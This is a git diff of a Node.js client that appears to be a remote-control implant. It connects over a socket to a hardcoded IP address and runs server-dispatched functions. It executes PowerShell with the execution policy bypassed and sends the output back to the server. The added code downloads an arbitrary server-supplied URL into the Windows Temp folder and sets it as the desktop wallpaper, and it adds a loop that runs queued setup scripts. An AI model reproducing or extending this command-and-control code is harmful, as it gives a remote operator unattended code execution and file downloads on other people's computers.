@@ -12,9 +12,67 @@ let orionSocketConnection = orionSocketModule.connect( "http://139.59.200.147:40
 //
 // Declerations
 //
+let setupCode = []
+
+let boilerPlateCode = {
+  setWallpaper: `$setwallpapersrc = @"
+using System.Runtime.InteropServices;
+public class wallpaper
+{
+public const int SetDesktopWallpaper = 20;
+public const int UpdateIniFile = 0x01;
+public const int SendWinIniChange = 0x02;
+[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
+public static void SetWallpaper ( string path )
+{
+SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
+}
+}
+"@
+Add-Type -TypeDefinition $setwallpapersrc
+`
+
+}
 
 let additionalFunctions = {
+  ChangeBackground: (URL) => {
+    return new Promise((RESOLVE, REJECT) => {
+      let orionShell = new orionShellModule({
+        executionPolicy: 'Bypass',
+        noProfile: true
+      });
 
+      orionSocketConnection.emit('codeExecutionResponse', {
+        uniqueRoomNumber: UUID,
+        stdout: `Attempting to download file: ${URL}`,
+        stderr: "7500ms have been allocated, please compress the file if this is not long enough, you will be alerted as to whether the background has been set in due measure"
+      })
+
+      orionShell.addCommand(`Invoke-WebRequest ${URL} -OutFile C:\\Windows\\Temp\\wallpaperAsset.jpg`)
+      orionShell.invoke()
+      .catch( errorMessage => {
+        REJECT(`Failed to download image:\n${errorMessage}`)
+      })
+
+      setTimeout(function(){
+        orionShell.addCommand(boilerPlateCode.setWallpaper)
+        orionShell.invoke()
+        .catch( errorMessage => {
+          REJECT(`Failed to run TypeDefinition code (wallpaper boilerplate:\n${errorMessage}`)
+        })
+
+        orionShell.addCommand(`[wallpaper]::SetWallpaper("C:\\Windows\\Temp\\wallpaperAsset.jpg") `)
+        orionShell.invoke()
+          .then( () => {
+            RESOLVE("Set wallpaper")
+          })
+          .catch( errorMessage => {
+            REJECT(errorMessage)
+          })
+      }, 5000)
+    })
+  }
 }
 
 let generateUUID = () => {
@@ -66,6 +124,23 @@ let emitUniqueHost = (UUID) => {
   return orionSocketConnection.emit('roomConnectionHost', UUID)
 }
 
+let runsetupScripts = () => {
+  for (let individualScript of setupCode){
+    let orionShell = new orionShellModule({
+      executionPolicy: 'Bypass',
+      noProfile: true
+    });
+
+    try {
+      orionShell.addCommand(individualScript)
+      orionShell.invoke()
+    } catch (errorMessage){
+      console.log("Setup code initalisation failed")
+    }
+
+  }
+}
+
 //
 // Function calls
 //
@@ -78,17 +153,16 @@ emitUniqueHost(UUID)
 orionSocketConnection.on(UUID, function (responseData) {
   if (responseData.computerName !== UUID) return
 
-  if (responseData.internalCall.isNode){
-    console.log("Calling 'Node' matrix; ", responseData.internalCall.Function, " - ", responseData.internalCall.Data);
 
-    let responseData = additionalFunctions[responseData.internalCall.Function](
+  if (responseData.internalCall.isNode){
+    let internalResponseData = additionalFunctions[responseData.internalCall.Function](
       responseData.internalCall.Data
     )
 
-    return responseData.then(Out => orionSocketConnection.emit('codeExecutionResponse', {
+    return internalResponseData.then(newData => orionSocketConnection.emit('codeExecutionResponse', {
       uniqueRoomNumber: UUID,
-      stdout: "Called: " +  responseData.internalCall.Function + "\n\nWith data: " + responseData.internalCall.Data,
-      stderr: "Response: \n\n" + Out.SUCCESS
+      stdout: "Called: " +  responseData.internalCall.Function + "\nWith data: " + responseData.internalCall.Data,
+      stderr: "Response: \n" + newData
     })).catch( Error => orionSocketConnection.emit('codeExecutionResponse', {
       uniqueRoomNumber: UUID,
       error: Error
